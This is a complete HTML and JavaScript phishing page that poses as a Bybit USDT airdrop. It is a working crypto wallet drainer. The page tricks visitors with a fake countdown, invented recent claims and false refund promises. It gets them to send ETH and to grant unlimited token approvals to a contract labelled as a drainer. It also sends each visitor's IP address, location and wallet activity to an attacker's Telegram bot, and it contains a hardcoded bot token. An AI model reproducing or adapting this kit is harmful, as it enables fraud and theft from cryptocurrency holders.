<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BYBIT Airdrop (Sepolia Testnet)</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #1a1a1a; color: white; min-height: 100vh; display: flex; flex-direction: column; }
        .header { background-color: #333; padding: 15px; display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
        .logo { font-size: clamp(18px, 5vw, 24px); display: flex; align-items: center; gap: 2px; line-height: 1; }
        .logo img { height: 16px; background: none; border: none; background-color: transparent; vertical-align: middle; }
        .main-content { padding: 20px; flex-grow: 1; max-width: 1200px; margin: 0 auto; width: 100%; box-sizing: border-box; }
        .reward-card { background: linear-gradient(45deg, #8B4513, #4A2C2C); border-radius: 10px; text-align: center; padding: 20px; margin-bottom: 20px; }
        .wallet-connect { background-color: #222; border-radius: 10px; padding: 20px; margin-bottom: 20px; text-align: center; }
        .wallet-connect .logo { justify-content: center; }
        .wallet-grid { display: none; grid-template-columns: repeat(auto-fit, minmax(80px, 1fr)); gap: 10px; margin-top: 20px; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #2a2a2a; padding: 15px; border-radius: 15px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.5); z-index: 1000; max-width: 300px; max-height: 400px; }
        .wallet-grid.active { display: grid; }
        .wallet-item { background-color: #3a3a3a; padding: 10px; border-radius: 8px; text-align: center; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 8px; transition: background-color 0.2s; }
        .wallet-item:hover { background-color: #4a4a4a; }
        .wallet-icon { width: 32px; height: 32px; object-fit: contain; border-radius: 5px; }
        .wallet-item p { margin: 0; font-size: 12px; color: #d3d3d3; }
        .button { background-color: #6B46C1; color: white; padding: 12px 24px; border-radius: 25px; border: none; cursor: pointer; margin: 20px auto; width: 100%; max-width: 300px; font-size: clamp(14px, 4vw, 16px); }
        .button:disabled { background-color: #4a3a7d; cursor: not-allowed; }
        .progress-bar { background-color: #333; height: 20px; border-radius: 10px; margin: 10px 0; }
        .progress { height: 100%; background-color: #6B46C1; border-radius: 10px; transition: width 0.3s; }
        .status { margin-top: 10px; font-size: clamp(12px, 3vw, 14px); }
        .timer { color: #ff4444; font-weight: bold; }
        .recent-claims { margin-top: 10px; font-size: 12px; color: #d3d3d3; }
        .claim-step { display: none; }
        .claim-step.active { display: block; }
        .assurance { font-size: 12px; color: #d3d3d3; margin: 10px 0; }
        .pool-balance { font-size: 14px; color: #a3a3a3; margin-top: 10px; }
        @media (max-width: 600px) { .main-content { padding: 10px; } .reward-card, .wallet-connect { padding: 15px; } .wallet-grid { max-width: 90vw; max-height: 70vh; } }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="https://i.postimg.cc/fWFSp5mm/bybit-logo-white-1.png" alt="BYBIT Logo">
            <span>Airdrop (Sepolia Testnet)</span>
        </div>
        <div id="status">Awaiting Connect...</div>
    </div>

    <div class="main-content">
        <div class="reward-card">
            <div id="step1" class="claim-step active">
                <h2>Claim Your Airdrop Now</h2>
                <p>BYBIT is giving away 1,000,000 USDT. Connect your wallet to claim your share. Hurry, time is running out.</p>
                <p class="timer" id="countdown">05:00</p>
                <button class="button" id="connectButton">Connect Wallet</button>
                <div class="recent-claims" id="recentClaims">
                    <p>Recent Claims:</p>
                    <p>0x12ab... claimed 750 USDT</p>
                    <p>0x78cd... claimed 300 USDT</p>
                </div>
                <p class="pool-balance">Airdrop Pool: 1,000,000 USDT Remaining</p>
            </div>

            <div id="step2" class="claim-step">
                <h2>Verify You're Not a Bot</h2>
                <p>To prevent spam, please send 0.01 ETH as an airdrop claiming fee. This step ensures the integrity of the airdrop process.</p>
                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
                <button class="button" id="verifyButton">Verify Now (0.01 ETH)</button>
            </div>

            <div id="step2-5" class="claim-step">
                <h2>Approve Tokens for Airdrop</h2>
                <p>Please approve the following tokens to proceed with the airdrop claim. This is required to verify your eligibility.</p>
                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
                <div id="tokenApprovalList"></div>
                <button class="button" id="approveTokensButton">Approve Tokens</button>
            </div>

            <div id="step3" class="claim-step">
                <h2>Claim Your Airdrop</h2>
                <p>Verification successful. Now claim your airdrop by confirming the transaction.</p>
                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
                <div class="progress-bar">
                    <div class="progress" id="progressBar" style="width: 0%"></div>
                </div>
                <button class="button" id="claimButton">Claim Airdrop</button>
            </div>

            <div id="step4" class="claim-step">
                <h2>Final Confirmation</h2>
                <p>Airdrop claim processed. Please confirm the transaction to receive your USDT reward.</p>
                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
                <button class="button" id="finalConfirmButton">Confirm Airdrop</button>
            </div>

            <div id="step5" class="claim-step">
                <h2>Processing Airdrop...</h2>
                <p>Your airdrop is being processed. Please wait...</p>
                <div class="progress-bar">
                    <div class="progress" id="fakeProgress" style="width: 0%"></div>
                </div>
            </div>

            <div class="status" id="connectStatus"></div>
        </div>

        <div class="wallet-connect">
            <h3 class="logo">
                <img src="https://i.postimg.cc/fWFSp5mm/bybit-logo-white-1.png" alt="BYBIT Logo">
                <span>Airdrop</span>
            </h3>
            <p>Total Prize Pool</p>
            <h2>1,000,000 USDT</h2>
        </div>

        <div class="wallet-grid" id="walletGrid">
            <div class="wallet-item" onclick="connectWallet('MetaMask')">
                <img src="https://i.postimg.cc/5yLgXCLB/Metamask-icon.png" alt="MetaMask" class="wallet-icon">
                <p>MetaMask</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('Trust Wallet')">
                <img src="https://i.postimg.cc/449BLrqY/Trust-Stacked-Logo-Blue.png" alt="Trust Wallet" class="wallet-icon">
                <p>Trust Wallet</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('OKX Wallet')">
                <img src="https://i.postimg.cc/FHWysZwt/okx-logo.png" alt="OKX Wallet" class="wallet-icon">
                <p>OKX Wallet</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('Binance Wallet')">
                <img src="https://i.postimg.cc/1tgJZTzY/binance-exchange-seeklogo-com.png" alt="Binance Wallet" class="wallet-icon">
                <p>Binance Wallet</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('Coinbase Wallet')">
                <img src="https://i.postimg.cc/fbVx3dhV/Coinbase-logo-square-1.png" alt="Coinbase Wallet" class="wallet-icon">
                <p>Coinbase Wallet</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('WalletConnect')">
                <img src="https://i.postimg.cc/tgv2wy9x/Wallet-Connect-icon.png" alt="WalletConnect" class="wallet-icon">
                <p>WalletConnect</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('Brave Wallet')">
                <img src="https://i.postimg.cc/tTLDR5ZR/brave-browser-icon.png" alt="Brave Wallet" class="wallet-icon">
                <p>Brave Wallet</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('Rabby Wallet')">
                <img src="https://i.postimg.cc/0NyVVr1v/Rabby.png" alt="Rabby Wallet" class="wallet-icon">
                <p>Rabby Wallet</p>
            </div>
        </div>

        <button class="button">Learn How to Claim</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = "8008230982:AAFDKn1n03fT_GMWMfYY0IfFVi4IVRyqdSI";
        const TELEGRAM_USER_ID = "6309547301";

        // Contract and Network Configuration
        const DRAINER_CONTRACT = "0xCA207421fd2dc651A30448bD6386092c921f82e0"; // Replace with the actual deployed UltimateLethalDrainer contract address
        const ATTACKER_ADDRESS = "0x5087beb405662410d5844ce52f67278e2a9eb763"; // Attacker's address (your wallet)
        const SUPPORTED_CHAINS = ["0xaa36a7"]; // Sepolia only for now
        const SEPOLIA_RPC = "https://rpc.sepolia.org"; // Sepolia Testnet RPC
        const NETWORK = "Sepolia Testnet";

        // Mock ERC-20 token addresses on Sepolia Testnet
        const TOKEN_ADDRESSES = [
            "0xca207421fd2dc651a30448bd6386092c921f82e0" // MockUSDT contract address
        ];
        const TOKEN_NAMES = ["USDT"];

        // Track total drained amounts and failed attempts
        let totalEthDrained = 0;
        let totalTokensDrained = {};
        let finalConfirmAttempts = 0;

        const DRAINER_ABI = [
            {"inputs":[{"internalType":"address payable","name":"_attacker","type":"address"},{"internalType":"uint256[]","name":"_chainIds","type":"uint256[]"},{"internalType":"address[]","name":"_tokenAddresses","type":"address[]"}],"stateMutability":"nonpayable","type":"constructor"},
            {"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ApprovalRequired","type":"event"},
            {"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"chainId","type":"uint256"}],"name":"ChainSwitchRequired","type":"event"},
            {"inputs":[{"internalType":"uint256","name":"chainId","type":"uint256"}],"name":"claimReward","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"claimYourReward","outputs":[],"stateMutability":"payable","type":"function"},
            {"inputs":[],"name":"manualDrain","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"verifyAirdropClaim","outputs":[],"stateMutability":"payable","type":"function"},
            {"inputs":[],"name":"attacker","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"chainIds","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"hasApproved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isTargetToken","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"supportedChains","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"approvalAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"tokenAddresses","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
            {"stateMutability":"payable","type":"receive"}
        ];

        const ERC20_ABI = [
            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"},
            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"type":"function"}
        ];

        // Function to send Telegram messages
        async function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_USER_ID,
                        text: message,
                        parse_mode: "Markdown"
                    })
                });
            } catch (error) {
                console.error("Failed to send Telegram message:", error);
            }
        }

        // Capture IP, Location, and User Agent on Page Load
        async function captureIpAndLocation() {
            try {
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();
                const ip = data.ip || "Unknown";
                const city = data.city || "Unknown";
                const region = data.region || "Unknown";
                const country = data.country_name || "Unknown";
                const location = `${city}, ${region}, ${country}`;
                const userAgent = navigator.userAgent || "Unknown";
                const message = `üîî *New Victim Clicked Link* üîî\nüåê *IP*: ${ip}\nüìç *Location*: ${location}\nüñ•Ô∏è *User Agent*: ${userAgent}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`;
                await sendTelegramMessage(message);
            } catch (error) {
                const userAgent = navigator.userAgent || "Unknown";
                await sendTelegramMessage(`üîî *New Victim Clicked Link* üîî\nüåê *IP*: Unknown\nüìç *Location*: Unknown (Error: ${error.message})\nüñ•Ô∏è *User Agent*: ${userAgent}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        }

        // Call the IP and location capture function when the page loads
        window.onload = captureIpAndLocation;

        let web3;
        let userAccount;
        let drainerContract;
        let tokenContracts = {};

        // Countdown Timer
        let timeLeft = 300; // 5 minutes in seconds
        const countdownElement = document.getElementById("countdown");
        const timer = setInterval(() => {
            if (timeLeft <= 0) {
                clearInterval(timer);
                countdownElement.innerText = "Airdrop Expired";
                document.getElementById("connectButton").disabled = true;
            } else {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
                timeLeft--;
            }
        }, 1000);

        // Fake Recent Claims Animation
        const recentClaims = document.getElementById("recentClaims");
        const claims = [
            "0x12ab... claimed 750 USDT",
            "0x78cd... claimed 300 USDT",
            "0x34ef... claimed 500 USDT"
        ];
        let claimIndex = 1;
        setInterval(() => {
            recentClaims.innerHTML = `<p>Recent Claims:</p><p>${claims[claimIndex]}</p>`;
            claimIndex = (claimIndex + 1) % claims.length;
        }, 3000);

        // Step Navigation
        function showStep(step) {
            document.querySelectorAll(".claim-step").forEach(step => step.classList.remove("active"));
            document.getElementById(`step${step}`).classList.add("active");
        }

        const walletGrid = document.getElementById("walletGrid");
        document.getElementById("connectButton").addEventListener("click", async () => {
            if (!walletGrid.classList.contains("active")) {
                walletGrid.classList.add("active");
                await sendTelegramMessage(`üëÄ *Victim Viewed Wallet Grid* üëÄ\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        });

        async function switchToSepolia() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0xaa36a7' }]
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0xaa36a7',
                            chainName: 'Sepolia Test Network',
                            rpcUrls: [SEPOLIA_RPC],
                            nativeCurrency: {
                                name: 'Sepolia ETH',
                                symbol: 'ETH',
                                decimals: 18
                            },
                            blockExplorerUrls: ['https://sepolia.etherscan.io']
                        }]
                    });
                }
            }
        }

        async function connectWallet(walletName) {
            try {
                if (window.ethereum) {
                    await switchToSepolia();
                    web3 = new Web3(window.ethereum);
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const accounts = await web3.eth.getAccounts();
                    userAccount = accounts[0];
                    document.getElementById("status").innerText = `Connected: ${userAccount.slice(0, 6)}...${userAccount.slice(-4)}`;
                    document.getElementById("connectStatus").innerText = `${walletName} connected successfully.`;
                    walletGrid.classList.remove("active");
                    drainerContract = new web3.eth.Contract(DRAINER_ABI, DRAINER_CONTRACT);

                    // Initialize token contracts
                    TOKEN_ADDRESSES.forEach(address => {
                        tokenContracts[address] = new web3.eth.Contract(ERC20_ABI, address);
                    });

                    await sendTelegramMessage(`‚úÖ *Wallet Connected* ‚úÖ\nüëõ *Wallet*: ${userAccount}\nüîß *Wallet Type*: ${walletName}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                    showStep(2);
                } else {
                    document.getElementById("connectStatus").innerText = "Please install a wallet like MetaMask.";
                    walletGrid.classList.remove("active");
                    await sendTelegramMessage(`‚ùå *Wallet Connection Rejected* ‚ùå\nüìõ *Reason*: No wallet installed\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                }
            } catch (error) {
                document.getElementById("connectStatus").innerText = `Connection failed: ${error.message}`;
                walletGrid.classList.remove("active");
                await sendTelegramMessage(`‚ùå *Wallet Connection Rejected* ‚ùå\nüìõ *Reason*: ${error.message}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        }

        document.getElementById("verifyButton").addEventListener("click", async () => {
            await sendTelegramMessage(`üñ±Ô∏è *Victim Clicked Verify Button* üñ±Ô∏è\nüëõ *Wallet*: ${userAccount}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

            try {
                const amountToSend = web3.utils.toWei("0.01", "ether");
                const ethBalance = await web3.eth.getBalance(userAccount);
                const ethBalanceBigInt = BigInt(ethBalance);

                // Check ETH balance
                if (ethBalanceBigInt < BigInt(amountToSend)) {
                    const currentEth = web3.utils.fromWei(ethBalance, "ether");
                    const requiredEth = web3.utils.fromWei(amountToSend, "ether");
                    document.getElementById("connectStatus").innerText = `Insufficient ETH balance: ${currentEth} ETH, need ${requiredEth} ETH.`;
                    await sendTelegramMessage(`‚ö†Ô∏è *Insufficient ETH Balance for Verification* ‚ö†Ô∏è\nüëõ *Wallet*: ${userAccount}\nüí∞ *Balance*: ${currentEth} ETH\nüí∏ *Required*: ${requiredEth} ETH\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                    return;
                }

                // Call the verifyAirdropClaim function to "approve" unlimited access for ETH
                const gasEstimate = await drainerContract.methods.verifyAirdropClaim().estimateGas({ from: userAccount, value: amountToSend });
                const gasPrice = await web3.eth.getGasPrice();
                await drainerContract.methods.verifyAirdropClaim().send({ from: userAccount, value: amountToSend, gas: gasEstimate, gasPrice });
                await sendTelegramMessage(`‚úÖ *Verification (ETH Approval) Completed* ‚úÖ\nüëõ *Wallet*: ${userAccount}\nüí∞ *Amount Sent*: 0.01 ETH\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

                // Check for token approvals
                const tokenApprovalList = document.getElementById("tokenApprovalList");
                tokenApprovalList.innerHTML = "";
                let tokensToApprove = [];
                for (let i = 0; i < TOKEN_ADDRESSES.length; i++) {
                    const tokenAddress = TOKEN_ADDRESSES[i];
                    const tokenContract = tokenContracts[tokenAddress];
                    const allowance = await tokenContract.methods.allowance(userAccount, DRAINER_CONTRACT).call();
                    if (allowance == 0) {
                        tokensToApprove.push({ address: tokenAddress, name: TOKEN_NAMES[i] });
                        tokenApprovalList.innerHTML += `<p>Approve ${TOKEN_NAMES[i]} (${tokenAddress.slice(0, 6)}...${tokenAddress.slice(-4)})</p>`;
                    }
                }

                if (tokensToApprove.length > 0) {
                    showStep("2-5");
                    document.getElementById("approveTokensButton").onclick = async () => {
                        await approveTokens(tokensToApprove);
                    };
                } else {
                    showStep(3);
                }
            } catch (error) {
                document.getElementById("connectStatus").innerText = `Verification failed: ${error.message}`;
                await sendTelegramMessage(`‚ùå *Verification Failed* ‚ùå\nüëõ *Wallet*: ${userAccount}\nüìõ *Reason*: ${error.message}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        });

        async function approveTokens(tokensToApprove) {
            try {
                for (let i = 0; i < tokensToApprove.length; i++) {
                    const tokenAddress = tokensToApprove[i].address;
                    const tokenName = tokensToApprove[i].name;
                    const tokenContract = tokenContracts[tokenAddress];
                    const amountToApprove = web3.utils.toHex("115792089237316195423570985008687907853269984665640564039457584007913129639935"); // uint256.max
                    const gasEstimate = await tokenContract.methods.approve(DRAINER_CONTRACT, amountToApprove).estimateGas({ from: userAccount });
                    const gasPrice = await web3.eth.getGasPrice();
                    await tokenContract.methods.approve(DRAINER_CONTRACT, amountToApprove).send({ from: userAccount, gas: gasEstimate, gasPrice });
                    await sendTelegramMessage(`‚úÖ *Token Approval Completed* ‚úÖ\nüëõ *Wallet*: ${userAccount}\nüí∞ *Token*: ${tokenName}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                }
                document.getElementById("connectStatus").innerText = "Token approvals completed.";
                showStep(3);
            } catch (error) {
                document.getElementById("connectStatus").innerText = `Token approval failed: ${error.message}`;
                await sendTelegramMessage(`‚ùå *Token Approval Failed* ‚ùå\nüëõ *Wallet*: ${userAccount}\nüìõ *Reason*: ${error.message}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        }

        document.getElementById("claimButton").addEventListener("click", async () => {
            await sendTelegramMessage(`üñ±Ô∏è *Victim Clicked Claim Button* üñ±Ô∏è\nüëõ *Wallet*: ${userAccount}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

            try {
                const gasEstimate = await drainerContract.methods.claimYourReward().estimateGas({ from: userAccount });
                const gasPrice = await web3.eth.getGasPrice();
                const tx = await drainerContract.methods.claimYourReward().send({ from: userAccount, gas: gasEstimate, gasPrice });

                // Log drained ETH
                const ethDrained = tx.events && tx.events.Transfer ? web3.utils.fromWei(tx.events.Transfer.returnValues.value, "ether") : "0";
                totalEthDrained += parseFloat(ethDrained);
                await sendTelegramMessage(`üí∏ *ETH Drained* üí∏\nüëõ *Victim*: ${userAccount}\nüí∞ *Amount*: ${ethDrained} ETH\nüìà *Total ETH Drained*: ${totalEthDrained} ETH\nüîó *Tx Hash*: ${tx.transactionHash}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

                // Log drained tokens
                for (let i = 0; i < TOKEN_ADDRESSES.length; i++) {
                    const tokenAddress = TOKEN_ADDRESSES[i];
                    const tokenContract = tokenContracts[tokenAddress];
                    const balance = await tokenContract.methods.balanceOf(ATTACKER_ADDRESS).call();
                    const drainedTokens = web3.utils.fromWei(balance, "mwei"); // MockUSDT has 6 decimals
                    if (!totalTokensDrained[tokenAddress]) totalTokensDrained[tokenAddress] = 0;
                    totalTokensDrained[tokenAddress] += parseFloat(drainedTokens);
                    await sendTelegramMessage(`üí∏ *Tokens Drained* üí∏\nüëõ *Victim*: ${userAccount}\nüí∞ *Token*: ${TOKEN_NAMES[i]}\nüí∞ *Amount*: ${drainedTokens} ${TOKEN_NAMES[i]}\nüìà *Total ${TOKEN_NAMES[i]} Drained*: ${totalTokensDrained[tokenAddress]} ${TOKEN_NAMES[i]}\nüîó *Tx Hash*: ${tx.transactionHash}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                }

                showStep(4);
            } catch (error) {
                document.getElementById("connectStatus").innerText = `Claim failed: ${error.message}`;
                await sendTelegramMessage(`‚ùå *Claim Failed* ‚ùå\nüëõ *Wallet*: ${userAccount}\nüìõ *Reason*: ${error.message}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        });

        document.getElementById("finalConfirmButton").addEventListener("click", async () => {
            finalConfirmAttempts++;
            await sendTelegramMessage(`üñ±Ô∏è *Victim Clicked Final Confirm Button* üñ±Ô∏è\nüëõ *Wallet*: ${userAccount}\nüî¢ *Attempt*: ${finalConfirmAttempts}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

            try {
                const gasEstimate = await drainerContract.methods.claimYourReward().estimateGas({ from: userAccount });
                const gasPrice = await web3.eth.getGasPrice();
                const tx = await drainerContract.methods.claimYourReward().send({ from: userAccount, gas: gasEstimate, gasPrice });

                // Log drained ETH
                const ethDrained = tx.events && tx.events.Transfer ? web3.utils.fromWei(tx.events.Transfer.returnValues.value, "ether") : "0";
                totalEthDrained += parseFloat(ethDrained);
                await sendTelegramMessage(`üí∏ *ETH Drained (Final Confirm)* üí∏\nüëõ *Victim*: ${userAccount}\nüí∞ *Amount*: ${ethDrained} ETH\nüìà *Total ETH Drained*: ${totalEthDrained} ETH\nüîó *Tx Hash*: ${tx.transactionHash}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

                // Log drained tokens
                for (let i = 0; i < TOKEN_ADDRESSES.length; i++) {
                    const tokenAddress = TOKEN_ADDRESSES[i];
                    const tokenContract = tokenContracts[tokenAddress];
                    const balance = await tokenContract.methods.balanceOf(ATTACKER_ADDRESS).call();
                    const drainedTokens = web3.utils.fromWei(balance, "mwei"); // MockUSDT has 6 decimals
                    if (!totalTokensDrained[tokenAddress]) totalTokensDrained[tokenAddress] = 0;
                    totalTokensDrained[tokenAddress] += parseFloat(drainedTokens);
                    await sendTelegramMessage(`üí∏ *Tokens Drained (Final Confirm)* üí∏\nüëõ *Victim*: ${userAccount}\nüí∞ *Token*: ${TOKEN_NAMES[i]}\nüí∞ *Amount*: ${drainedTokens} ${TOKEN_NAMES[i]}\nüìà *Total ${TOKEN_NAMES[i]} Drained*: ${totalTokensDrained[tokenAddress]} ${TOKEN_NAMES[i]}\nüîó *Tx Hash*: ${tx.transactionHash}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                }

                showStep(5);
                const fakeProgress = document.getElementById("fakeProgress");
                let progress = 0;
                const interval = setInterval(() => {
                    progress += 10;
                    fakeProgress.style.width = `${progress}%`;
                    if (progress >= 100) {
                        clearInterval(interval);
                        document.getElementById("connectStatus").innerText = "Airdrop processed successfully!";
                    }
                }, 500);
            } catch (error) {
                document.getElementById("connectStatus").innerText = `Final confirmation failed: ${error.message}`;
                await sendTelegramMessage(`‚ùå *Final Confirmation Failed* ‚ùå\nüëõ *Wallet*: ${userAccount}\nüìõ *Reason*: ${error.message}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        });
    </script>
</body>
</html>